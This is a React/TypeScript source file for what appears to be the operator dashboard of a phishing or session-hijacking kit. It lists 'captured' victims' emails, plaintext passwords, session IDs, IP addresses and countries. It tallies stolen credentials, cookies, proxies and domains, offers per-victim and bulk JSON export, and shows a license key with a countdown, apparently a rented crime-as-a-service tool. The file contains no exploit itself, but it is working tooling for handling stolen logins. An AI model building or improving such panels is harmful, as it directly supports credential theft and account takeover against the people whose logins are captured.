"use client";

import { useEffect, useMemo, useState } from "react";
import { Activity, Clock3, Download, Eye, FileDown, KeyRound, Search, Trash2, Users } from "lucide-react";

export type LogRow = {
  id: string;
  email: string;
  password: string;
  fullSessionId: string;
  clientIp: string;
  service: string;
  country: string;
  firstSeen: string;
  lastSeen: string;
  fullTimestamp: string;
};

export type DashboardStats = {
  clients: number;
  credentials: number;
  cookies: number;
  proxies: number;
  domains: number;
  securityEvents: number;
};

function downloadJson(filename: string, payload: unknown) {
  const blob = new Blob([JSON.stringify(payload, null, 2)], {
    type: "application/json",
  });
  const url = URL.createObjectURL(blob);
  const link = document.createElement("a");
  link.href = url;
  link.download = filename;
  link.click();
  URL.revokeObjectURL(url);
}

export function OverviewClient({
  initialRows,
  stats,
  licenseId,
  expiresAt,
}: {
  initialRows: LogRow[];
  stats: DashboardStats;
  licenseId: string;
  expiresAt: string;
}) {
  const [rows, setRows] = useState(initialRows);
  const [query, setQuery] = useState("");
  const [selected, setSelected] = useState<LogRow | null>(null);
  const timeLeft = useCountdown(expiresAt);

  const filteredRows = useMemo(() => {
    const normalized = query.trim().toLowerCase();
    if (!normalized) return rows;
    return rows.filter((row) =>
      Object.values(row).some((value) => value.toLowerCase().includes(normalized)),
    );
  }, [query, rows]);

  return (
    <div className="min-h-screen px-4 py-6 sm:px-6 lg:px-8">
      <div className="mx-auto max-w-7xl space-y-6">
        <div className="flex flex-col gap-4 lg:flex-row lg:items-end lg:justify-between">
          <div>
            <p className="text-sm font-medium text-cyan-300">Dashboard</p>
            <h1 className="mt-2 text-3xl font-semibold tracking-tight text-[var(--text)]">Overview</h1>
            <p className="mt-2 max-w-2xl text-sm leading-6 text-[var(--muted)]">
              Review captured log data, export all records, download row payloads, or remove stale entries.
            </p>
          </div>
          <button
            type="button"
            onClick={() => downloadJson("ce-admin-log-data.json", rows)}
            className="flex items-center justify-center gap-2 rounded-lg bg-cyan-400 px-4 py-2.5 text-sm font-semibold text-slate-950 transition hover:bg-cyan-300"
          >
            <FileDown className="h-4 w-4" />
            Export All
          </button>
        </div>

        <div className="grid gap-4 lg:grid-cols-[1.2fr_0.8fr]">
          <div className="rounded-lg border border-[var(--border)] bg-[var(--panel)] p-5">
            <p className="text-sm text-[var(--muted)]">License key</p>
            <p className="mt-3 break-all font-mono text-lg font-semibold text-[var(--text)]">{licenseId}</p>
            <div className="mt-5 grid gap-3 sm:grid-cols-4">
              {[
                ["Days", timeLeft.days],
                ["Hours", timeLeft.hours],
                ["Minutes", timeLeft.minutes],
                ["Seconds", timeLeft.seconds],
              ].map(([label, value]) => (
                <div key={label} className="rounded-lg bg-[var(--surface)] p-3 text-center">
                  <p className="text-2xl font-semibold text-[var(--text)]">{value}</p>
                  <p className="text-xs text-[var(--muted)]">{label}</p>
                </div>
              ))}
            </div>
          </div>
          <div className="rounded-lg border border-[var(--border)] bg-[var(--panel)] p-5">
            <label htmlFor="search" className="text-sm font-medium text-[var(--text)]">
              Search logs
            </label>
            <div className="mt-3 flex items-center rounded-lg border border-[var(--border)] bg-[var(--surface)] px-3">
              <Search className="h-4 w-4 text-[var(--muted)]" />
              <input
                id="search"
                value={query}
                onChange={(event) => setQuery(event.target.value)}
                placeholder="Filter by email, IP, country, session, or service"
                className="min-w-0 flex-1 bg-transparent px-3 py-3 text-sm text-[var(--text)] outline-none placeholder:text-slate-500"
              />
            </div>
            <p className="mt-4 text-sm text-[var(--muted)]">{filteredRows.length} visible from {rows.length} log rows</p>
          </div>
        </div>

        <div className="grid gap-4 sm:grid-cols-2 xl:grid-cols-6">
          <StatCard label="Clients" value={stats.clients} icon={Users} />
          <StatCard label="Credentials" value={stats.credentials} icon={KeyRound} />
          <StatCard label="Cookies" value={stats.cookies} icon={Download} />
          <StatCard label="Proxies" value={stats.proxies} icon={Activity} />
          <StatCard label="Domains" value={stats.domains} icon={Clock3} />
          <StatCard label="Security" value={stats.securityEvents} icon={Activity} />
        </div>

        <div className="overflow-hidden rounded-lg border border-[var(--border)] bg-[var(--panel)]">
          <div className="overflow-x-auto">
            <table className="min-w-[1320px] w-full divide-y divide-white/10 text-left text-sm">
              <thead className="bg-[var(--surface)] text-xs uppercase text-[var(--muted)]">
                <tr>
                  {[
                    "ID",
                    "Email/Username",
                    "Password",
                    // "Full Session ID",
                    "Client IP",
                    "Service",
                    "Country",
                    // "First Seen",
                    // "Last Seen",
                    // "Timestamp",
                    "Actions",
                  ].map((heading) => (
                    <th key={heading} className="px-4 py-3 font-semibold">
                      {heading}
                    </th>
                  ))}
                </tr>
              </thead>
              <tbody className="divide-y divide-white/10">
                {filteredRows.map((row) => (
                  <tr key={row.id} className="hover:bg-[var(--surface)]">
                    <td className="px-4 py-4 font-mono text-xs text-[var(--muted)]">{row.id}</td>
                    <td className="px-4 py-4 font-medium text-[var(--text)]">{row.email}</td>
                    <td className="px-4 py-4">
                      <span className="rounded-md border border-[var(--border)] bg-[var(--surface)] px-2 py-1 font-mono text-xs text-[var(--text)]">
                        {row.password}
                      </span>
                    </td>
                    {/* <td className="px-4 py-4 font-mono text-xs text-[var(--muted)]">
                      {row.fullSessionId.slice(0, 16)}...
                    </td> */}
                    <td className="px-4 py-4 text-[var(--text)]">{row.clientIp}</td>
                    <td className="px-4 py-4 text-[var(--text)]">{row.service}</td>
                    <td className="px-4 py-4 text-[var(--text)]">{row.country}</td>
                    {/* <td className="px-4 py-4 text-[var(--muted)]">{row.firstSeen}</td>
                    <td className="px-4 py-4 text-[var(--muted)]">{row.lastSeen}</td>
                    <td className="px-4 py-4 text-[var(--muted)]">{row.fullTimestamp}</td> */}
                    <td className="px-4 py-4">
                      <div className="flex items-center gap-2">
                        <button
                          type="button"
                          onClick={() => setSelected(row)}
                          className="flex h-9 w-9 items-center justify-center rounded-lg border border-[var(--border)] text-[var(--muted)] transition hover:bg-[var(--surface)] hover:text-[var(--text)]"
                          aria-label={`View ${row.id}`}
                          title="View details"
                        >
                          <Eye className="h-4 w-4" />
                        </button>
                        <button
                          type="button"
                          onClick={() => downloadJson(`${row.email}.json`, row)}
                          className="flex h-9 w-9 items-center justify-center rounded-lg border border-[var(--border)] text-[var(--muted)] transition hover:bg-[var(--surface)] hover:text-[var(--text)]"
                          aria-label={`Download ${row.id}`}
                          title="Download JSON"
                        >
                          <Download className="h-4 w-4" />
                        </button>
                        <button
                          type="button"
                          onClick={() => setRows((current) => current.filter((item) => item.id !== row.id))}
                          className="flex h-9 w-9 items-center justify-center rounded-lg border border-rose-400/20 text-rose-300 transition hover:bg-rose-400/10"
                          aria-label={`Delete ${row.id}`}
                          title="Delete row"
                        >
                          <Trash2 className="h-4 w-4" />
                        </button>
                      </div>
                    </td>
                  </tr>
                ))}
                {filteredRows.length === 0 ? (
                  <tr>
                    <td colSpan={11} className="px-4 py-12 text-center text-sm text-slate-500">
                      No log data matches the current filter.
                    </td>
                  </tr>
                ) : null}
              </tbody>
            </table>
          </div>
        </div>
      </div>
      {selected ? (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 px-4">
          <div className="max-h-[82vh] w-full max-w-2xl overflow-y-auto rounded-lg border border-[var(--border)] bg-[var(--panel)] p-5 shadow-2xl">
            <div className="flex items-center justify-between gap-4">
              <h2 className="text-lg font-semibold text-[var(--text)]">Log details</h2>
              <button
                type="button"
                onClick={() => setSelected(null)}
                className="rounded-lg border border-[var(--border)] px-3 py-1.5 text-sm text-[var(--text)]"
              >
                Close
              </button>
            </div>
            <dl className="mt-5 grid gap-3 sm:grid-cols-2">
              {Object.entries(selected).map(([key, value]) => (
                <div key={key} className="rounded-lg bg-[var(--surface)] p-3">
                  <dt className="text-xs uppercase text-[var(--muted)]">{key}</dt>
                  <dd className="mt-1 break-all text-sm text-[var(--text)]">{value}</dd>
                </div>
              ))}
            </dl>
          </div>
        </div>
      ) : null}
    </div>
  );
}

function useCountdown(expiresAt: string) {
  const [now, setNow] = useState(() => Date.now());

  useEffect(() => {
    const timer = window.setInterval(() => setNow(Date.now()), 1000);
    return () => window.clearInterval(timer);
  }, []);

  const remaining = Math.max(0, new Date(expiresAt).getTime() - now);
  return {
    days: Math.floor(remaining / 86_400_000),
    hours: Math.floor((remaining % 86_400_000) / 3_600_000),
    minutes: Math.floor((remaining % 3_600_000) / 60_000),
    seconds: Math.floor((remaining % 60_000) / 1000),
  };
}

function StatCard({
  label,
  value,
  icon: Icon,
}: {
  label: string;
  value: number;
  icon: React.ComponentType<{ className?: string }>;
}) {
  return (
    <div className="rounded-lg border border-[var(--border)] bg-[var(--panel)] p-4">
      <div className="flex items-center justify-between">
        <p className="text-sm text-[var(--muted)]">{label}</p>
        <Icon className="h-4 w-4 text-cyan-400" />
      </div>
      <p className="mt-3 text-2xl font-semibold text-[var(--text)]">{value}</p>
    </div>
  );
}
